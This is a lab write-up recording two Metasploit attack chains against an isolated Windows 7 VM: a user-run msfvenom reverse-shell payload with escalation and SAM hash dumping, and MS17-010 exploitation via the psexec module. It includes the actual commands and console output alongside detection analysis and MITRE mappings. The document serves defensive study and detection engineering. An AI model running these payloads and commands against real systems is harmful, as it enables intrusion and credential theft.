# Attack Chains — Execution Record

What was actually done, what it produced, and what a defender would have had to
see. The [build guide](00-BUILD-GUIDE.md) covers procedure; this is the record of
execution.

**Target:** Windows 7 Enterprise 7601 SP1 x86 (`192.168.56.20`), unpatched,
firewall and Defender disabled, SMBv1 enabled.
**Attacker:** Kali Linux (`192.168.56.10`), Metasploit Framework.
**Containment:** isolated host-only segment, no gateway on the victim, attacker's
NAT interface disabled throughout.

---

## Reconnaissance

```
nmap -sn 192.168.56.0/24
nmap -sS -sV -p- 192.168.56.20
```

Full TCP sweep — 65,535 ports — returning:

| Port | Service | Note |
|---|---|---|
| 22 | OpenSSH 6.7 | **Not a stock Windows 7 service** |
| 135 | msrpc | |
| 139, 445 | netbios-ssn, microsoft-ds | MS17-010 attack surface |
| 49152–49157 | msrpc | Dynamic RPC range |

**Finding: an unexpected SSH service.** Windows 7 ships no SSH server, so port 22
was either a scanning artefact or something genuinely installed. It was
confirmed twice more during post-exploitation — `sshd` and `sshd_server` service
accounts appeared in the credential dump, and `sshd.exe` and `cygrunsrv.exe`
appeared in the process list running from `C:\Program Files\OpenSSH\`. The image
carries a Cygwin-based OpenSSH server.

This matters for accuracy of the target description. "Stock Microsoft IE8/Win7
image" would have been wrong, and anyone reproducing the work against a genuinely
stock image would face a different attack surface.

**Cost:** this reconnaissance produced **132,727 packets in 4.8 minutes**. The
compromise that followed produced 493. The scan achieved nothing except
confirming what a single targeted probe would have shown, at 269 times the
network footprint.

---

## Chain A — user-executed payload

**MITRE ATT&CK:** T1204.002 (User Execution: Malicious File) → T1071.001
(Application Layer Protocol: Web Protocols) → T1055 (Process Injection) →
T1134 (Access Token Manipulation) → T1003.002 (OS Credential Dumping: SAM)

### Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o update.exe
```

7,168 bytes, x86. SHA-256 recorded in
[`evidence/payload-sha256.txt`](../evidence/payload-sha256.txt); the binary
itself is deliberately not published.

The architecture matters more than it appears. The victim is 32-bit, and the x64
payload connects and dies within a second — a failure that presents as a network
problem rather than an architecture mismatch, and misdiagnoses easily.

### Delivery and execution

Served over HTTP from Apache on the attacker; downloaded and run through Internet
Explorer on the victim. Session established at 13:21:24:

```
[*] Sending stage (199238 bytes) to 192.168.56.20
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:49159)
```

**The shape of this is the detection opportunity.** A 7,168-byte executable ran,
then pulled **199,238 bytes** back down the same connection. The dropper is small
and unremarkable; the stage is 28 times larger and carries a full PE structure.
Detection effort belongs on the second transfer, which is why rule 6 targets it.

### Post-exploitation

```
sysinfo    → Windows 7 (6.1 Build 7601, Service Pack 1), x86, WORKGROUP
getuid     → IE8WIN7\IEUser
getsystem  → got system via technique 1 (Named Pipe Impersonation)
getuid     → NT AUTHORITY\SYSTEM
```

Escalation from a standard user to SYSTEM required one command and no exploit —
named pipe impersonation against a host with UAC disabled.

`hashdump` then returned the local SAM. Two observations, stated without the
values:

- **The Administrator and IEUser accounts share an identical NT hash.** Same
  password on both. This is how lateral movement begins in real environments —
  one compromised workstation account yields administrative access elsewhere.
- **Two accounts, including the `sshd` service account, carry the NT hash of an
  empty string.** A service account with no password, on a host exposing SSH.

### Process migration

```
migrate 852       → explorer.exe
getuid            → IE8WIN7\IEUser
```

Migration into `explorer.exe` detached the session from the dropper, so
terminating the malicious executable no longer ends the compromise. Note that it
*dropped privileges back to IEUser* — the session inherits the target process's
token, so migrating from SYSTEM into a user-owned process is a downgrade. This
surprises people; it is worth stating plainly.

### What the host saw

```
PID   PPID  Name           User            Path
2728  2544  update[1].exe  IE8WIN7\IEUser  C:\Users\IEUser\AppData\Local\...\
                                           Temporary Internet Files\Content.IE5\
                                           4WBQ2RYQ\update[1].exe
2544   852  iexplore.exe   IE8WIN7\IEUser
```

**Internet Explorer spawning an executable out of its own browser cache.** One of
the most reliable malicious-download indicators available, trivially visible to
Sysmon or any EDR — and structurally invisible to a network sensor, which sees
bytes on a wire and has no concept of process ancestry.

This is the concrete case for layered detection. The network sensor caught the
download and the C2 channel; only host telemetry could have caught the
relationship between them.

---

## Chain B — remote exploitation, MS17-010

**MITRE ATT&CK:** T1210 (Exploitation of Remote Services) → T1569.002
(System Services: Service Execution) → T1071.001

### Vulnerability confirmation

```
auxiliary/scanner/smb/smb_ms17_010
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 SP1 x86
```

Confirmed before exploitation was attempted rather than assumed —
[`evidence/chainB-ms17010-scan.txt`](../evidence/chainB-ms17010-scan.txt).

### Module selection

`ms17_010_eternalblue` targets 64-bit Windows 7 and Server 2008 R2 and is
unreliable against 32-bit hosts. `ms17_010_psexec` exploits the same
vulnerability by a route that works on x86, and was used instead.

### The failed attempt

```
[*] 192.168.56.20:445 - Target OS: Windows 7 Enterprise 7601 Service Pack 1
[-] 192.168.56.20:445 - Unable to find accessible named pipe!
[-] Exploit completed, but no session was created.
```

**This failure is a result, not an obstacle.** MS17-010 is routinely described as
unauthenticated and wormable — the property that made WannaCry spread. That
holds for `eternalblue` against x64. The `psexec` variant this 32-bit target
required needs a reachable named pipe, and anonymous access was refused.

Supplying credentials the attacker already possessed resolved it:

```
set SMBUser IEUser
set SMBPass <redacted>
```

**Exploitability of a single CVE varies by target architecture and by module.**
"Vulnerable to MS17-010" is not one property, and a vulnerability scanner
reporting it does not tell you whether it is remotely exploitable without
credentials.

### Exploitation

```
[*] Authenticating to 192.168.56.20 as user 'IEUser'...
[*] Built a write-what-where primitive...
[+] Overwrite complete... SYSTEM session obtained!
[*] Selecting PowerShell target
[*] Executing the payload...
[+] Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (199238 bytes) to 192.168.56.20
[*] Meterpreter session 2 opened (192.168.56.10:5555 -> 192.168.56.20:49160)
```

```
getuid → NT AUTHORITY\SYSTEM
getpid → 2608
```

**SYSTEM immediately.** No user interaction, no escalation step. Kernel memory
corruption — the "write-what-where primitive" — grants SYSTEM at the moment of
compromise. Contrast Chain A, which landed as a standard user and needed a
separate escalation.

### Service creation over SMB

The packet capture shows the execution mechanism:

```
SVCCTL  CreateServiceW request
SVCCTL  StartServiceW request
SVCCTL  DeleteService request
```

A Windows service created, started and deleted over SMB. This is the psexec
pattern, and it is a stronger detection target than the exploitation itself —
remote service creation is how a large family of lateral movement techniques
executes code, MS17-010 or otherwise.

---

## Comparison

| | Chain A | Chain B |
|---|---|---|
| Initial access | User executes downloaded file | Remote SMB exploitation |
| User interaction | Required | None |
| Credentials | None | **Required** |
| Landed as | `IE8WIN7\IEUser` | `NT AUTHORITY\SYSTEM` |
| Escalation | `getsystem` | None needed |
| Execution mechanism | Direct | Windows service via SMB |
| C2 port | 4444 | 5555 |
| Meterpreter stage | 199,238 bytes | 199,238 bytes |
| Capture | 493 packets / 17.7 min | 581 packets / 5.5 min |

**The identical stage is what makes these a controlled experiment.** Two
different access vectors, two different ports, one byte-identical payload. The
detection results can therefore attribute a hit to a specific stage of the
intrusion rather than to the intrusion as a whole — which is what allowed rules 5
and 6 to be compared meaningfully.

---

## Defender's view

| Stage | Network-visible | Host-visible |
|---|---|---|
| Reconnaissance | Loudly — 132,727 packets | Failed connections only |
| Delivery (A) | HTTP request for an executable | Browser writes to cache |
| Execution (A) | Nothing | **`iexplore.exe` → `update[1].exe`** |
| Exploitation (B) | SMBv1 Trans2, service creation | Service install and deletion |
| C2 establishment | Outbound connection, large stage transfer | New network-connected process |
| Escalation | **Nothing** | Token manipulation |
| Credential access | **Nothing** | SAM read |
| Migration | **Nothing** | Cross-process injection |

Everything after the C2 channel is established happens *inside* a session that
already exists. To a network sensor it is bytes on an open socket. Privilege
escalation, credential dumping and process migration — the actions that turn
access into control — produce no distinguishable network signature at all.

This is the structural limit of network detection, and the reason the measured
results concentrate entirely on the delivery and C2 stages.

---

## Evidence

| Artefact | Location |
|---|---|
| Chain A capture (delivery, staging, C2) | [`pcaps/chainA-exploitation.pcap`](../pcaps/chainA-exploitation.pcap) |
| Reconnaissance capture | [`pcaps/chainA-recon.pcap`](../pcaps/chainA-recon.pcap) |
| Chain B capture | [`pcaps/chainB-run1.pcap`](../pcaps/chainB-run1.pcap) |
| Untrimmed original | [`pcaps/chainA-run1.pcap`](../pcaps/chainA-run1.pcap) |
| Full nmap output | [`evidence/chainA-nmap-full.txt`](../evidence/chainA-nmap-full.txt) |
| MS17-010 scan | [`evidence/chainB-ms17010-scan.txt`](../evidence/chainB-ms17010-scan.txt) |
| Payload hash | [`evidence/payload-sha256.txt`](../evidence/payload-sha256.txt) |
| Screenshots | [`docs/screenshots/`](screenshots/) |

All captures carry published SHA-256 digests, verified after transfer from the
sensor.

**Chain B's capture is contaminated.** The Chain A session was not terminated
before Chain B was run and continued beaconing on port 4444 throughout. This was
found through TCP conversation analysis and filtered out; the analysis uses the
filtered `chainB-clean`. The uncorrected original is retained.
